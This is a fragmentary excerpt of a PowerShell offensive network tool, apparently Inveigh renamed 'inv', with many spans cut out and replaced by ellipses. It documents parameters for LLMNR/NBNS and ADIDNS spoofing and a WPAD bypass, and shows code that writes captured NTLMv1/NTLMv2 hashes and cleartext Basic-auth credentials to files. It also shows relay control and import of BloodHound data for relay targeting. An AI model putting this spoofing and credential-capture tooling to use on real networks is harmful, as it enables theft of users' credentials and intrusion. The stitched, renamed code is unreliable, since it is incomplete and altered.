...
This is primarily for the GQBL bypass for wpad. This attack can be used with inv's DNS spoofer. Wildcard injects a wildcard record.
...
Default = 4: The threshold used to determine when ADIDNS records are injected for the combo attack. inv will
...
.PARAMETER Elevated
Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if inv is running with
...
Default = inv: The issuer field for the cert that will be installed for HTTPS.
...
running inv through a shell that does not return other output streams. Note that you will not see the various
...
prevent login requests from being processed by the inv host.  
...
Default = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, inv will send out
LLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is received, inv will add the
hostname to a spoofing blacklist.

.PARAMETER SpooferLearningDelay
(Integer) Time in minutes that inv will delay spoofing while valid hosts are being blacklisted through
SpooferLearning.

.PARAMETER SpooferLearningInterval
Default = 30 Minutes: (Integer) Time in minutes that inv wait before sending out an LLMNR/NBNS request for a
...
(Integer) Number of matching LLMNR/NBNS name requests to receive before inv will begin responding to those
requests.

.PARAMETER SpooferThresholdNetwork
(Integer) Number of matching LLMNR/NBNS requests to receive from different systems before inv will begin
...
.EXAMPLE
invk-inv -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
...
.EXAMPLE
invk-inv -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
Execute specifying an HTTP redirect response. 

.LINK
https://github.com/Kevin-Robertson/inv
#>
...
( 
    ...
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "inv",
...
if($inveigh.running)
{
    Write-Output "[-] inv is already running"
    throw
}
...
if(!$inveigh.relay_running)
{
    ...
    $inveigh.cleartext_out_file = $output_directory + "\inv-Cleartext.txt"
    $inveigh.log_out_file = $output_directory + "\inv-Log.txt"
    $inveigh.NTLMv1_out_file = $output_directory + "\inv-NTLMv1.txt"
    $inveigh.NTLMv2_out_file = $output_directory + "\inv-NTLMv2.txt"
    $inveigh.POST_request_out_file = $output_directory + "\inv-FormInput.txt"
}
...
$inveigh.output_queue.Add("[*] inv $inveigh_version started at $(Get-Date -format s)") > $null
...
if($ShowHelp -eq 'Y')
{
    $inveigh.output_queue.Add("[!] Run Stop-inv to stop")  > $null
                ...
                if($Capture -eq 'Y')
                {
                    ...
                    if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                    {
                        ...
                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
                        {
                            ...
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to " + "inv-NTLMv2.txt") > $null
                        }
                ...
                if($Capture -eq 'Y')
                {
                    ...
                    if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                    {
                        ...
                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
                        {
                            ...
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to " + "inv-NTLMv1.txt") > $null
                        }
    ...
    :HTTP_listener_loop while($inveigh.running -and $HTTP_running)
    {
        ...
        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*" -or $TCP_request -like "50-4f-53-54*")
        {
            ...
            elseif($HTTP_header_authorization.Startswith('Basic '))
            {
                ...
                if($inveigh.file_output)
                {
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic authentication cleartext credentials written to " + "inv-Cleartext.txt") > $null
                }
...
$sniffer_scriptblock = 
{
    ...
    if($Pcap -eq 'File')
    {
        $pcap_path = $output_directory + "\inv-Packets.pcap"
...
$control_scriptblock =
{
    ...
    function Stop-invRunspace
    {
        ...
        if($inveigh.relay_running)
        {
            ...
            if($Message)
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] inv Relay is exiting due to $Message") > $null
            }
            else
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] inv Relay is exiting") > $null  
            }
        ...
        if($inveigh.running)
        {
            ...
            if($Message)
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] inv is exiting due to $Message") > $null
            }
            else
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] inv is exiting") > $null  
            }
    ...
    while($inveigh.running)
    {
        ...
        if($RunCount)
        {
            ...
            {
                Stop-invRunspace "reaching run count"           
            }
        ...
        if($RunTime)
        {
            ...
            {
                Stop-invRunspace "reaching run time"
            }
...
<#
.SYNOPSIS
Stop-inv will stop all running inv functions.
#>
    ...
    if($inveigh)
    {
        ...
        {
            $inveigh.console_queue.Clear()
            Watch-inv -NoConsoleMessage
        }
        else
        {
            Write-Output "[-] There are no running inv functions"
        }
...
<#
.SYNOPSIS
Get-inv will get stored inv data from memory.
...
<#
.SYNOPSIS
Watch-inv will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.
...
if($inveigh.tool -ne 1)
{
    ...
    {
        Write-Output "[-] inv isn't running"
    }

}
else
{
    Write-Output "[-] Watch-inv cannot be used with current external tool selection"
}
...
<#
.SYNOPSIS
Clear-inv will clear inv data from memory.
#>
...
if($inveigh)
{
    ...
    if(!$inveigh.running -and !$inveigh.relay_running)
    {
        ...
        Write-Output "[+] inv data has been cleared from memory"
    }
    else
    {
        Write-Output "[-] Run Stop-inv before running Clear-inv"
    }
...
function ConvertTo-inv
{
    <#
    .SYNOPSIS
    ConvertTo-inv imports Bloodhound computers, groups and session JSON files into $inveigh.enumerate
    for inv Relay targeting.

    .DESCRIPTION
    For the fastest import, import the data before gather any enumeration data with inv.
    ...
    if($inveigh.running -or $inveigh.relay_running)
    {
        Write-Output "Run Stop-inv before importing data with ConvertTo-inv"
        throw
    }
    ...
    {       
        ...
        Write-Output "[*] Importing computers to inv"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
    ...
    if($Sessions)
    {
        ...
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing sessions to inv"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
    ...
    if($Groups)
    {
        ...
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing groups to inv"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
